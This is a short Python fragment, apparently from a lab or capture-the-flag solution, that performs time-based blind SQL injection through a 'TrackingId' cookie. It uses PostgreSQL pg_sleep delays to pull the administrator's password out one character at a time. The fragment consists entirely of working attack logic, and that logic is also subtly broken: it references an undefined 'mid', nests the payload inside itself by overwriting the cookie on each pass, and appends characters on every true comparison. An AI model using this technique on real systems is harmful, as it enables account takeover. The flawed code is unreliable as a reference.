...
for i in range(1, PASSWORD_LENGTH + 1):
    ...
    for char in range(min,max+1):
        payload = f"{COOKIE['TrackingId']}'%3BSELECT+CASE+WHEN+(username='administrator'+AND+ASCII(SUBSTRING(password,{i},1))>ASCII('{chr(mid)}'))+THEN+pg_sleep({TIME_DELAY})+ELSE+pg_sleep(0)+END+FROM+users--"
        COOKIE['TrackingId'] = payload
        response = requests.get(URL, cookies=COOKIE, headers=headers, verify=False)
        if (response.elapsed > timedelta(seconds=TIME_DELAY)):
            PASSWORD += chr(mid)
